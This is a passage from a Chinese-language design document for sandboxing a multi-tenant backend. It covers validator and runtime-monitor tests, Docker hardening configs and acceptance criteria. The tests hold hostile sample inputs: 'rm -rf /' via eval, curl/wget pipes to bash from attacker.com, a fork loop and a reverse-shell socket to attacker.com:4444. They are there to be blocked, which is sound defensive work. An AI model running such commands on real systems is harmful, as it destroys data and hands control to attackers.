eval("import os; os.system('rm -rf /')")
      `.trim()
      
      const result = await scriptValidator.validateScriptContent('/tmp/test.py')
      expect(result.allowed).toBe(false)
    })
    
    test('应该允许安全的构建脚本', async () => {
      const scriptContent = `
#!/bin/bash
echo "Building project..."
npm run build
echo "Build complete!"
      `.trim()
      
      const result = await scriptValidator.validateScriptContent('/tmp/build.sh')
      expect(result.allowed).toBe(true)
    })
  })
  
  describe('远程脚本下载检测', () => {
    test('应该阻止 curl | bash', () => {
      const result = scriptValidator.detectRemoteScriptExecution(
        'curl https://attacker.com/malicious.sh | bash'
      )
      expect(result.allowed).toBe(false)
      expect(result.severity).toBe('critical')
    })
    
    test('应该阻止 wget | bash', () => {
      const result = scriptValidator.detectRemoteScriptExecution(
        'wget -qO- https://attacker.com/script.sh | bash'
      )
      expect(result.allowed).toBe(false)
    })
    
    test('应该阻止 bash <(curl ...)', () => {
      const result = scriptValidator.detectRemoteScriptExecution(
        'bash <(curl -s https://attacker.com/script.sh)'
      )
      expect(result.allowed).toBe(false)
    })
    
    test('应该允许正常的 curl 下载', () => {
      const result = scriptValidator.detectRemoteScriptExecution(
        'curl -O https://example.com/file.txt'
      )
      expect(result.allowed).toBe(true)
    })
  })
  
  describe('脚本执行路径验证', () => {
    test('应该允许执行工作目录内的脚本', () => {
      const result = scriptValidator.validateScriptExecution(
        'python /workspaces/users/test-user/script.py'
      )
      expect(result.allowed).toBe(true)
    })
    
    test('应该阻止执行工作目录外的脚本', () => {
      const result = scriptValidator.validateScriptExecution(
        'python /etc/malicious.py'
      )
      expect(result.allowed).toBe(false)
      expect(result.severity).toBe('high')
    })
    
    test('应该阻止执行 /tmp 中的脚本', () => {
      const result = scriptValidator.validateScriptExecution(
        'bash /tmp/script.sh'
      )
      expect(result.allowed).toBe(false)
    })
  })
})

describe('脚本运行时监控', () => {
  let monitor: ScriptRuntimeMonitor
  
  beforeEach(() => {
    monitor = new ScriptRuntimeMonitor()
  })
  
  test('应该检测大量子进程创建', async () => {
    // 创建一个会生成大量子进程的脚本
    const scriptContent = `
import os, time
for i in range(100):
    os.fork()
    time.sleep(0.1)
    `.trim()
    
    // 启动监控
    const session = await monitor.startMonitoring('/tmp/fork_bomb.py', process)
    
    // 等待告警
    await new Promise(resolve => setTimeout(resolve, 5000))
    
    // 验证进程被终止
    expect(session.process.killed).toBe(true)
  })
  
  test('应该检测大量文件删除', async () => {
    // 创建一个会删除大量文件的脚本
    const scriptContent = `
import os
for i in range(100):
    os.remove(f'/workspaces/users/test-user/file_{i}.txt')
    `.trim()
    
    const session = await monitor.startMonitoring('/tmp/mass_delete.py', process)
    
    await new Promise(resolve => setTimeout(resolve, 5000))
    
    expect(session.process.killed).toBe(true)
  })
  
  test('应该检测可疑网络连接', async () => {
    // 创建一个会建立反向 shell 的脚本
    const scriptContent = `
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
    `.trim()
    
    const session = await monitor.startMonitoring('/tmp/reverse_shell.py', process)
    
    await new Promise(resolve => setTimeout(resolve, 5000))
    
    expect(session.process.killed).toBe(true)
  })
  
  test('应该检测执行超时', async () => {
    // 创建一个无限循环的脚本
    const scriptContent = `
import time
while True:
    time.sleep(1)
    `.trim()
    
    // 设置较短超时时间用于测试
    monitor.setLimits({ maxExecutionTimeMs: 2000 })
    
    const session = await monitor.startMonitoring('/tmp/infinite_loop.py', process)
    
    await new Promise(resolve => setTimeout(resolve, 3000))
    
    expect(session.process.killed).toBe(true)
  })
})
```

**Docker noexec 挂载测试**：

```typescript
describe('Docker noexec 挂载测试', () => {
  test('应该阻止直接执行脚本', () => {
    // 在 Docker 容器中执行
    const result = execSync('docker exec claude-backend chmod +x /app/workspaces/users/test-user/script.sh && /app/workspaces/users/test-user/script.sh', {
      encoding: 'utf8',
      stdio: 'pipe'
    })
    
    // 应该失败：Permission denied
    expect(result.stderr).toContain('Permission denied')
  })
  
  test('应该允许通过解释器执行脚本', () => {
    // 通过 bash 执行（应该被应用层验证）
    const result = execSync('docker exec claude-backend bash /app/workspaces/users/test-user/script.sh', {
      encoding: 'utf8'
    })
    
    // 脚本内容应该通过应用层验证
    expect(result.stdout).toContain('Build complete')
  })
})
```

---

## 📊 部署配置

### 开发环境（Windows + Docker Desktop）

**docker-compose.dev.yml**：
```yaml
version: '3.8'

services:
  backend:
    build:
      context: .
      dockerfile: server/Dockerfile.dev
    container_name: claude-backend-dev
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=development
      - TENANT_ISOLATION_ENABLED=true
      - ISOLATION_MODE=software  # 开发环境使用软件隔离
    volumes:
      - ./server:/app:cached
      - user_workspaces:/app/workspaces/users
    # 开发环境简化配置
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETUID
      - SETGID
    read_only: false  # 开发环境允许写入
    tmpfs:
      - /tmp
    networks:
      - claude-network

volumes:
  user_workspaces:
    driver: local

networks:
  claude-network:
    driver: bridge
```

### 生产环境（Linux）

**docker-compose.prod.yml**：
```yaml
version: '3.8'

services:
  backend:
    build:
      context: .
      dockerfile: server/Dockerfile
    container_name: claude-backend-prod
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - TENANT_ISOLATION_ENABLED=true
      - ISOLATION_MODE=hybrid  # 生产环境使用混合隔离
    volumes:
      - user_workspaces:/app/workspaces/users:rw
      - ./docker/seccomp-profile.json:/etc/seccomp-profile.json:ro
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETUID
      - SETGID
      - MKNOD
      - AUDIT_WRITE
    security_opt:
      - no-new-privileges:true
      - seccomp:/etc/seccomp-profile.json
    read_only: true
    tmpfs:
      - /tmp:noexec,nosuid,size=100m
      - /var/tmp:noexec,nosuid,size=50m
    user: "1000:1000"
    deploy:
      resources:
        limits:
          memory: 512M
          cpus: '1.0'
          pids: 100
    networks:
      - claude-network
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/api/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

volumes:
  user_workspaces:
    driver: local
    driver_opts:
      type: none
      o: bind
      device: /var/lib/claude/user-workspaces

networks:
  claude-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16
```

---

## 🔧 系统要求

### 宿主机配置（Linux）

**最低配置**：
- CPU: 2 核
- 内存：2GB
- 存储：10GB

**推荐配置**：
- CPU: 4 核
- 内存：4GB
- 存储：50GB SSD

### Docker 配置

**启用用户命名空间**（可选，增强安全）：
```bash
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```

**启用 Seccomp**（默认启用）：
```bash
# 验证 Seccomp 支持
docker info | grep -i seccomp
# 应该输出：Security Profile: seccomp
```

---

## 📈 监控和运维

### 日志收集

**配置 Docker 日志**：
```yaml
backend:
  logging:
    driver: "json-file"
    options:
      max-size: "10m"
      max-file: "3"
```

### 指标监控

**Prometheus 指标**（可选）：
```typescript
// 导出 Prometheus 指标
const metrics = {
  pty_sessions_total: ptyManager.getStats().totalSessions,
  security_alerts_total: alertManager.getAlertCount(),
  blocked_commands_total: sandbox.getBlockedCommandCount(),
  resource_violations_total: monitor.getViolationCount(),
}
```

---

## 🎯 验收标准

### 功能验收

1. ✅ 用户只能访问自己的工作目录
2. ✅ `cd ..` 可以正常工作，但无法逃逸到工作目录外
3. ✅ 危险命令（sudo、ssh 等）被阻止
4. ✅ 通过解释器执行系统命令被阻止
5. ✅ 所有安全事件都被记录到审计日志

### 脚本安全验收（新增❗）

1. ✅ **脚本内容验证**
   - 包含 `os.system()` 的 Python 脚本被阻止
   - 包含 `subprocess` 的 Python 脚本被阻止
   - 包含 `child_process` 的 Node.js 脚本被阻止
   - 包含 `eval()` 的脚本被阻止
   - 安全的构建脚本可以正常执行

2. ✅ **远程脚本下载检测**
   - `curl | bash` 被阻止
   - `wget | bash` 被阻止
   - `bash <(curl ...)` 被阻止
   - 正常的 `curl -O` 下载被允许

3. ✅ **脚本执行路径限制**
   - 只能执行工作目录内的脚本
   - 执行 `/etc` 中的脚本被阻止
   - 执行 `/tmp` 中的脚本被阻止
   - 通过 shebang 直接执行被阻止（noexec 挂载）

4. ✅ **脚本运行时监控**
   - 创建超过 5 个子进程被终止
   - 5 秒内删除超过 10 个文件被终止
   - 建立可疑网络连接被终止
   - 执行超过 60 秒被终止

### 安全验收

1. ✅ 容器以非 root 用户运行
2. ✅ 无法提权到 root
3. ✅ 根文件系统为只读
4. ✅ 资源限制生效（内存、CPU、进程数）
5. ✅ Seccomp 配置文件生效
6. ✅ `/tmp` 和 `/var/tmp` 使用 noexec 挂载

### 性能验收

1. ✅ 命令验证延迟 < 10ms
2. ✅ 路径解析延迟 < 5ms
3. ✅ 脚本内容验证延迟 < 50ms
4. ✅ 审计日志写入不阻塞主流程
5. ✅ 资源监控 CPU 占用 < 1%
6. ✅ 运行时监控内存占用 < 50MB

---

## 📝 后续优化方向

1. **容器编排集成**：支持 Kubernetes 部署
2. **动态策略更新**：无需重启即可更新安全策略
3. **机器学习检测**：基于行为模式的异常检测
4. **多租户计费**：基于资源使用的计费系统
5. **审计报表**：自动生成安全审计报告

---

## 📚 参考资料

- [Docker 安全最佳实践](https://docs.docker.com/engine/security/)
- [Seccomp 官方文档](https://docs.docker.com/engine/security/seccomp/)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Bubblewrap 项目](https://github.com/containers/bubblewrap)
- [Docker 用户命名空间](https://docs.docker.com/engine/security/userns-remap/)

---

## 📊 方案对比总结

### 脚本安全防护层次

| 层次 | 防护措施 | 绕过难度 | 性能影响 |
|------|----------|----------|----------|
| **应用层** | 命令验证、脚本内容分析 | ⭐⭐⭐ | 低 |
| **文件系统层** | noexec 挂载、只读文件系统 | ⭐⭐⭐⭐ | 无 |
| **容器层** | 能力限制、Seccomp | ⭐⭐⭐⭐⭐ | 无 |
| **运行时层** | 进程监控、网络监控 | ⭐⭐⭐⭐⭐ | 中 |

### 攻击场景与防护

| 攻击方式 | 防护措施 | 阻断层级 |
|----------|----------|----------|
| `python malicious.py` | 脚本内容验证 | 应用层 |
| `curl | bash` | 远程脚本检测 | 应用层 |
| `./script.sh` | noexec 挂载 | 文件系统层 |
| `os.system('rm -rf /')` | 危险模式检测 | 应用层 |
| Fork 炸弹 | 子进程监控 | 运行时层 |
| 反向 shell | 网络连接监控 | 运行时层 |
| 大量文件删除 | 文件操作监控 | 运行时层 |

### 实施时间估算

| 阶段 | 任务 | 时间 |
|------|------|------|
| 第一阶段 | 改进软件隔离（含脚本验证） | 2-3 天 |
| 第二阶段 | Docker 安全加固 | 1-2 天 |
| 第三阶段 | 用户容器隔离（可选） | 2-3 天 |
| 第四阶段 | 运行时监控 | 2-3 天 |
| 第五阶段 | 测试和验证 | 1-2 天 |
| **总计** | | **8-13 天** |

---

**文档版本**：v2.0（脚本安全增强版）  
**创建日期**：2026-04-10  
**最后更新**：2026-04-10  
**更新说明**：
- 新增脚本执行安全控制方案（1.3 节）
- 新增脚本运行时监控方案（4.1 节）
- 新增脚本安全专项测试（5.4 节）
- 新增脚本安全验收标准
- 完善 Docker 文件系统限制（2.1 节）
